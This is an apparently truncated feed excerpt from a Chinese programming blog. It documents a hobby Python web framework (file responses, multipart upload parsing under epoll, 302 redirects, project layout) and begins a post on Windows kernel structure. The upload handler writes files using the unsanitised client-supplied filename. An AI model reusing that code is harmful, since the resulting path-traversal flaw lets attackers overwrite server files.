class="line">    <span class="string">&quot;mpeg&quot;</span>: <span class="string">&quot;audio/mpeg&quot;</span>,   <span class="comment">#MPEG音频</span></span><br><span class="line">    <span class="string">&quot;wav&quot;</span>: <span class="string">&quot;audio/wav&quot;</span>,     <span class="comment">#WAV音频</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mp4&quot;</span> : <span class="string">&quot;video/mp4&quot;</span>,    <span class="comment">#MP4视频</span></span><br><span class="line">    <span class="string">&quot;mpeg&quot;</span> : <span class="string">&quot;video/mpeg&quot;</span>,  <span class="comment">#MPEG视频</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Response的返回改为bytes类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">    result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">type</span> = self.content_type)</span><br><span class="line">    result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        length=self.length)</span><br><span class="line">    result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(self.reply) == <span class="built_in">bytes</span>:</span><br><span class="line">        result += self.reply</span><br><span class="line">    <span class="keyword">else</span>:   result += self.reply.encode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>这样就能直接访问各种文件了，方便下一步渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_test</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/test.pdf&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.read()</span><br><span class="line">    result = Response(reply=result,<span class="built_in">type</span>=<span class="string">&quot;pdf&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/82845027c13d1eb42726354e98f2a0bc.png" alt="image-20230603110534674" /></p><h2 id="6-3~4-文件上传"><a class="markdownIt-Anchor" href="#6-3~4-文件上传"></a> 6-3~4 文件上传</h2><p>这部分写的挺久的，因为涉及到epoll模型的改善，后面回继续改进这个模块</p><p>首先有这两个视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_upload</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/file_upload.html&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.read()</span><br><span class="line">    result = Response(reply=result,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br><span class="line"></span><br><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    info(<span class="string">&quot;FILE Content&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    <span class="comment"># info(http_request.data[&quot;len&quot;]/1024,&quot;KB&quot;)</span></span><br><span class="line">    name = http_request.data[<span class="string">&quot;filename&quot;</span>]</span><br><span class="line">    <span class="comment"># print(http_request.data[&quot;file&quot;][:0x20])</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/&quot;</span>+name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.write(http_request.data[<span class="string">&quot;file&quot;</span>])</span><br><span class="line">    data = <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;okok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>,status_code=<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p>目前参考了Django的上传，把数据结果收集在request中然后处理</p><p>那么就涉及HttpRequest的处理</p><p>首先新增了两个字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.length = <span class="number">0</span>     <span class="comment">#总长度</span></span><br><span class="line">self.cur_len = <span class="number">0</span>    <span class="comment">#当前长度</span></span><br></pre></td></tr></table></figure><p>从这个判断文件上传是否完成，然后就是消息的提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件上传，返回bytes类型数据</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;multipart&quot;</span> <span class="keyword">in</span> content_type:</span><br><span class="line">    pre_len = <span class="built_in">len</span>(self.raw_data.split(<span class="string">b&quot;\r\n\r\n&quot;</span>)[<span class="number">0</span>])+<span class="number">4</span></span><br><span class="line">    raw_data = self.raw_data[pre_len:]</span><br><span class="line">    self.cur_len = <span class="built_in">len</span>(raw_data)</span><br><span class="line">    self.data=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,   <span class="string">&quot;filename&quot;</span>:<span class="string">&quot;&quot;</span>,  <span class="string">&quot;file&quot;</span>:<span class="string">b&quot;&quot;</span>, <span class="string">&quot;len&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">    boundary = <span class="string">b&quot;--&quot;</span> + r_boundary.search(self.raw_data).group(<span class="number">1</span>)</span><br><span class="line">    file_info = raw_data.split(boundary)[<span class="number">1</span>].split(<span class="string">b&quot;\r\n&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> attribute <span class="keyword">in</span> file_info.split(<span class="string">b&quot;; &quot;</span>):</span><br><span class="line">        <span class="comment">#   获得名字</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;name&quot;</span> <span class="keyword">in</span> attribute <span class="keyword">and</span> <span class="string">b&quot;=&quot;</span> <span class="keyword">in</span> attribute <span class="keyword">and</span> <span class="keyword">not</span> attribute.lower().startswith(<span class="string">b&quot;content&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">0</span>] == <span class="string">b&quot;name&quot;</span>:</span><br><span class="line">                self.data[<span class="string">&quot;name&quot;</span>] = <span class="string">b&quot;&quot;</span>.join(attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">1</span>:])[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line">            <span class="keyword">elif</span> attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">0</span>] == <span class="string">b&quot;filename&quot;</span>:</span><br><span class="line">                <span class="comment">#   获得原始文件名</span></span><br><span class="line">                self.data[<span class="string">&quot;filename&quot;</span>] = <span class="string">b&quot;&quot;</span>.join(attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">1</span>:])[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line">    file_type = raw_data.split(boundary)[<span class="number">1</span>].split(<span class="string">b&quot;\r\n&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    pre_len = <span class="built_in">len</span>(file_info) + <span class="built_in">len</span>(file_type) + <span class="number">2</span>*<span class="number">4</span> <span class="comment">#前置长度</span></span><br><span class="line"></span><br><span class="line">    self.data[<span class="string">&quot;file&quot;</span>] = self.raw_data.split(boundary)[<span class="number">1</span>][pre_len:-<span class="number">2</span>]</span><br><span class="line">    self.data[<span class="string">&quot;len&quot;</span>] = <span class="built_in">len</span>(self.data[<span class="string">&quot;file&quot;</span>])</span><br></pre></td></tr></table></figure><p>由于使用了epoll模型，当上传的数据长度小于总长度时继续上传，完成后再进行处理，那么server就会有如下修改</p><p>数据可读时继续读取客户端发送过来的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> event &amp; select.EPOLLIN:</span><br><span class="line">    <span class="comment"># 有数据可读</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="string">b&quot;&quot;</span></span><br><span class="line">        data = connections[fileno].recv(<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># print(&quot;data from server\n&quot;,data)</span></span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            requests[fileno] += data</span><br></pre></td></tr></table></figure><p>由于我的epoll对每个发送过来的package都有一个response，所以需要修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理请求并生成响应</span></span><br><span class="line"><span class="keyword">for</span> fileno, data <span class="keyword">in</span> requests.items():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;HTTP&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">b&quot;http&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 解析请求头部</span></span><br><span class="line">        http = HTTPRequest(data=data, fileno=fileno, connections=connections)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> http.cur_len &lt; http.length:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            http.show()</span><br><span class="line">            http_route = HTTPRouter(http)</span><br><span class="line">            response = http_route.route()</span><br><span class="line">            responses[fileno] = response</span><br><span class="line"></span><br><span class="line">            connections[fileno].send(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造响应头部和内容</span></span><br><span class="line">            <span class="comment"># 清空请求缓冲区</span></span><br><span class="line">            response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            requests[fileno] = <span class="string">b&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d560daa9e9524c8c670e0fb8ee5109d2.png" alt="image-20230604123749998" /></p><p>然后测试了下效率，面对小文件的时候效率还说得过去（&lt;10MB），大文件的话又是使用的是对应<code>fd</code>的data进行拼接，增大了内存开销和CPU开销（不知道使用c的指针会不会快一些），这也是后续需要优化的东西</p><p><img src="https://img.joe1sn.top/uploads/big/6ec85adf5a170138cfaf12cf96bf7bc5.png" alt="小文件" /></p><p><img src="https://img.joe1sn.top/uploads/big/aa1d26b05febf943087b4b4fba07ba4a.png" alt="大文件" /><img src="https://img.joe1sn.top/uploads/big/516a0bd7170f4b3101a24eaf0b62fc58.png" alt="大文件2" /></p><p>更大的文件后面会出现指数级下降，不过这里也可以看出来基于TCP的拥塞控制，单次发包最大为128kb，分块传输，后续可以针对这些特性进行改进。</p><h2 id="6-6-重定向"><a class="markdownIt-Anchor" href="#6-6-重定向"></a> 6-6 重定向</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>(<span class="params">http_request</span>):</span><br><span class="line">    data= <span class="string">&quot;http://www.qq.com&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,status_code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p>主要就是通过302跳转进行重定向，然后在返回报文哪里设置了几个新的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\nLocation: &#123;location&#125;\r\n\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code], location=self.reply)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">    result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">type</span> = self.content_type)</span><br><span class="line">    result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        length=self.length)</span><br><span class="line">    result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result.encode()</span><br><span class="line">    <span class="keyword">if</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(self.reply) == <span class="built_in">bytes</span>:</span><br><span class="line">            result += self.reply</span><br><span class="line">        <span class="keyword">else</span>:   result += self.reply.encode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>之后可以在utils里面打包这些方法，我这里放在http_response下面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重定向</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>(<span class="params">http_url</span>):</span><br><span class="line">    data= <span class="built_in">str</span>(http_url)</span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,status_code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;从0到1开发一个勉强能用的python web“框架”&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/Joe1sn/muud&quot;&gt;https://github.com/Joe1sn/muud&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="muud" scheme="https://joe1sn.eu.org/tags/muud/"/>
    
    <category term="web framework" scheme="https://joe1sn.eu.org/tags/web-framework/"/>
    
  </entry>
  
  <entry>
    <title>【Muud开发】1.基础结构解析</title>
    <link href="https://joe1sn.eu.org/2023/06/01/web-0x1/"/>
    <id>https://joe1sn.eu.org/2023/06/01/web-0x1/</id>
    <published>2023-05-31T17:43:18.000Z</published>
    <updated>2023-06-01T14:31:23.538Z</updated>
    
    <content type="html"><![CDATA[<p>从0到1开发一个勉强能用的python web“框架”</p><p>项目地址：<a href="https://github.com/Joe1sn/muud">https://github.com/Joe1sn/muud</a></p><span id="more"></span><h1 id="简单介绍"><a class="markdownIt-Anchor" href="#简单介绍"></a> 简单介绍</h1><p>​在毕业设计的时候，初始选题为《基于XMPP的即时通讯系统》，想的是自己照着RFC写一遍XMPP协议，但是时间不够（毕竟要上班）。所以把废案再利用，抽出其中的一些部分，<strong>从Socket到web框架</strong>，实现一个简单的CURD功能，锻炼一下自己的文档化编程能力。受我个人能力有限会随时断更，一路上只有vscode和chatGPT以及所需要的RFC文档。</p><p>​再说说已实现的部分，首先是确定在Linux上运行的，使用python语言</p><ul><li><p>使用epoll模型完成了部分HTTP服务器的功能</p><p><img src="https://img.joe1sn.top/uploads/big/dbd4bb8a1731037c6334379055b450bc.png" alt="image-20230601015224293" /></p></li><li><p>sqlalchemy完成了数据库的ORM实现</p><p><img src="https://img.joe1sn.top/uploads/big/e832ffc52b70c65e6e796d14c5492273.png" alt="数据库实现" /></p><p><img src="https://img.joe1sn.top/uploads/big/204faa35fc0267fca1b4b8dd4e05f435.png" alt="ORM使用示例" /></p></li><li><p>路由通过闭包完成</p><p><img src="https://img.joe1sn.top/uploads/big/9a90cd82302a2b47ca3be38818feccc7.png" alt="image-20230601015455217" /></p><p><img src="https://img.joe1sn.top/uploads/big/326180139c370cd9bb466210db93314d.png" alt="image-20230601015736199" /></p></li><li><p>视图部分编写（只考虑JSON传递）</p><p><img src="https://img.joe1sn.top/uploads/big/55f5abfa762abc34bf49fe4d6389f374.png" alt="image-20230601015921484" /></p><p><img src="https://img.joe1sn.top/uploads/big/306a31c86f6d380858ddc90d451683af.png" alt="image-20230601015909570" /></p></li><li><p>启动部分参考了Django的设计</p><p><img src="https://img.joe1sn.top/uploads/big/0967be71afa21dab39ca0ca3f4809ea4.png" alt="image-20230601020119447" /></p></li></ul><p>最后运行的效果</p><p><img src="https://img.joe1sn.top/uploads/big/ef7a4d4dbaea1b76e34445f36e3c71da.png" alt="image-20230601020247259" /></p><h1 id="需求分析"><a class="markdownIt-Anchor" href="#需求分析"></a> 需求分析</h1><p>根据ChatGPT，一个典型的Python Web框架通常由以下几个核心组件组成：</p><ol><li>路由（Routing）：路由用于将传入的HTTP请求映射到相应的处理程序或视图函数上。它确定了不同URL路径与应用程序中的不同功能点之间的关联关系。</li><li>视图（Views）：视图是处理HTTP请求并生成HTTP响应的函数或方法。它们接收来自路由的请求并执行相应的逻辑，最后返回响应给客户端。</li><li>模板引擎（Template Engine）：模板引擎允许开发者将静态模板和动态数据结合，生成最终的HTML响应。模板引擎通常支持模板语法、变量替换、条件判断、循环等功能，以简化动态内容的生成。</li><li>中间件（Middleware）：中间件是位于请求和视图之间的组件，用于在请求到达视图之前或响应返回客户端之前执行一些通用的功能。中间件可以处理身份验证、请求预处理、错误处理等任务。</li><li>数据库访问（Database Access）：Web框架通常提供了对数据库的支持，以便应用程序可以与数据库进行交互。这包括连接数据库、执行查询和操作、ORM（对象关系映射）等功能。</li><li>表单处理（Form Handling）：Web应用程序通常需要处理用户提交的表单数据。框架提供了表单验证、数据绑定、错误处理等功能，使开发者可以方便地处理表单数据。</li><li>身份验证与授权（Authentication and Authorization）：身份验证用于验证用户的身份，而授权则用于确定用户是否有权限执行特定操作。框架通常提供了身份验证和授权的支持，以便开发者可以轻松实现用户认证和授权功能。</li><li>测试框架（Testing Framework）：测试框架用于编写和执行自动化测试，以确保应用程序的正确性和稳定性。它提供了测试用例的编写、运行和断言等功能。</li></ol><p>后来的项目像参考Django的设计</p><p>目前项目缺少的：</p><ul><li>模板渲染：设计的时候考虑到前后端分离是开发，没有想过渲染</li><li>中间件：完全没有设计</li><li>表单处理：完全没有设计</li><li>测试框架：还在学</li></ul><p>对于Django这样的框架来说，开启一个项目后，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── 开启的app名称</span><br><span class="line">│   ├── admin.py</span><br><span class="line">│   ├── apps.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── migrations</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── tests.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── 项目名称</span><br><span class="line">│   ├── asgi.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   └── wsgi.py</span><br><span class="line">├── manage.py</span><br><span class="line">├── static</span><br><span class="line">└── templates</span><br></pre></td></tr></table></figure><p><code>views.py</code>是视图、<code>models.py</code>是ORM对象、<code>asgi.py\wsgi.py</code>是HTTP服务、<code>setting.py</code>是设置、<code>url.py</code>是路由，项目从<code>manage,py</code>开始，那么就可以整理一下原来的代码了。</p><p>那么目前项目的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">├── config</span><br><span class="line">│   ├── client.conf</span><br><span class="line">│   ├── database.conf        </span><br><span class="line">│   ├── server.conf</span><br><span class="line">│   ├── server.crt</span><br><span class="line">│   ├── server.csr</span><br><span class="line">│   └── server.key</span><br><span class="line">├── manage.py</span><br><span class="line">├── README.md</span><br><span class="line">├── requirements.txt</span><br><span class="line">├── rprint.py</span><br><span class="line">├── server</span><br><span class="line">│   ├── db.py</span><br><span class="line">│   ├── models.py     </span><br><span class="line">│   ├── serialization.py</span><br><span class="line">│   ├── server.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   ├── utils</span><br><span class="line">│   │   ├── autoreload.py</span><br><span class="line">│   │   ├── epollcontrol.py</span><br><span class="line">│   │   ├── functional.py</span><br><span class="line">│   └── views.py</span><br><span class="line">└── test</span><br></pre></td></tr></table></figure><ul><li><p><strong>config</strong></p><p>包含数据库配置(<code>database.conf</code>)，SSL使用的证书(<code>server.csr</code>)和key(<code>server.key</code>)，socket服务配置(<code>server.conf</code>)</p></li><li><p><strong>utils</strong></p><p>一些帮助模块</p></li><li><p><strong>server</strong></p><p>主要功能实现，包括路由、epoll管理、数据库相关，其中<code>views.py</code>可以编写api，<code>urls.py</code>中设置路由</p></li><li><p><strong>test</strong></p><p>一些测试用例</p></li></ul><p>目前应该专注于第一块：优化epoll性能以及wsgi、asgi的实现。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从0到1开发一个勉强能用的python web“框架”&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/Joe1sn/muud&quot;&gt;https://github.com/Joe1sn/muud&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="muud" scheme="https://joe1sn.eu.org/tags/muud/"/>
    
    <category term="web framework" scheme="https://joe1sn.eu.org/tags/web-framework/"/>
    
  </entry>
  
  <entry>
    <title>【win内核原理与实现】I. Windows系统结构</title>
    <link href="https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/"/>
    <id>https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/</id>
    <published>2023-05-24T03:28:39.000Z</published>
    <updated>2023-06-01T14:31:05.149Z</updated>
    
    <content type="html"><![CDATA[<p>Windows系统结构还有引导过程</p><span id="more"></span><h2 id="ia-大致结构"><a class="markdownIt-Anchor" href="#ia-大致结构"></a> I.a 大致结构</h2><p>windows内核是从<code>windows NT</code>内核发展过来的，从开始就和硬件的发展息息相关。</p><p>Windows采用双模式（<code>dual mode</code>）结构来保护操作系统内核不受应用程序的错误而出现崩溃</p><p><img src="https://img.joe1sn.top/uploads/big/268a5b458897e4a4a77a3368415c50a7.png" alt="img" /></p><p>windows的原始设计是一个支持多环境子系统的os，它还支持POSIX和OS/2环境子系统.为他们提供仿真执行环境</p><h2 id="ib-windows内核组成结构"><a class="markdownIt-Anchor" href="#ib-windows内核组成结构"></a> I.b windows内核组成结构</h2><p><img src="https://img.joe1sn.top/uploads/big/b2e4ecf4e493b23fd28d8640d524aac3.png" alt="内核组成结构.drawio" /></p><p>关于函数的开头</p><ul><li><code>nt</code>：内核提供的服务</li><li><code>Ldr</code>：映像加载器函数</li><li><code>Csr</code>：Windows子进程通讯函数</li><li><code>Dbg</code>：调试函数</li><li><code>Etw</code>：系统时间函数</li><li><code>Rtl</code>：运行支持函数</li></ul><p>执行体API函数接收的参数来自各种应用程序，通常会在程序的最开始处，对所接受的参数逐一探查他们的可访问性。</p><h1 id="ii-windows内核关键组件"><a class="markdownIt-Anchor" href="#ii-windows内核关键组件"></a> II. windows内核关键组件</h1><h2 id="hal-硬件抽象层"><a class="markdownIt-Anchor" href="#hal-硬件抽象层"></a> HAL 硬件抽象层</h2><p>HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，改名为<code>hal.dll</code>。涉及中断控制器、单处理器/多处理器硬件断点。</p><h2 id="内核微内核"><a class="markdownIt-Anchor" href="#内核微内核"></a> 内核（微内核）</h2><p>在内核模块<code>ntoskrnl.exe</code>中的上层部分为执行体，下层最接近HAL的就是内核。负责进程调度、中断和异常处理，核心任务是尽可能让系统中的所有处理器变得高效。</p><p>windows内核使用抢占式调度，由于采用面向对象的设计，使得它主要面向两个对象：<strong>分发器</strong> 和 <strong>控制</strong> 两个对象</p><ul><li>分发器对象：实现各种同步功能。影响线程调度，主要用于 <strong>事件(event)</strong> <strong>突变体(mutant) 信号量(semaphore) 进程(process) 线程(thread) 队列(query) 门(gate) 定时器(timer)</strong></li><li>控制对象：用于控制内核的操作，不影响线程调度。包括 <strong>异步调用(APC) 延迟过程调用(DPC) 中断对象</strong></li></ul><h2 id="执行体"><a class="markdownIt-Anchor" href="#执行体"></a> 执行体</h2><p>在内核模块<code>ntoskrnl.exe</code>中的上层部分，包含5种类型的函数</p><ul><li>被导出的、可以在用户模式下调用的函数。位于 <code>ntdll.dll</code> 中。一般就是win API</li><li>没有被导出、可以在用户模式下调用的函数。比如常见的反调试函数，包括各种LRC(<code>Local Process Call</code>，本地调用过程)、各种查询函数和专业函数。</li><li>只能在内核模式下调用的导出函数。在<code>windows 